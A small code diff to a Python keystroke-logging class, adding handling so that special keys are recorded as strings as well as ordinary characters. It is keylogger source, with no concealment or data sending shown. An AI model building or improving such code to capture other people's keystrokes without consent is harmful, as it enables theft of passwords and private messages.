@@ -21,7 +21,10 @@ class KeyLoggerService(IKeyLogger):
         self.listener = keyboard.Listener(on_press=self.on_press)
 
     def on_press(self, key):
-        self.char_list.append(key.char)
+        try:
+            self.char_list.append(key.char)
+        except AttributeError:
+            self.char_list.append(key.__str__())
 
     def start_logging(self) -> None:
         self.listener.start()
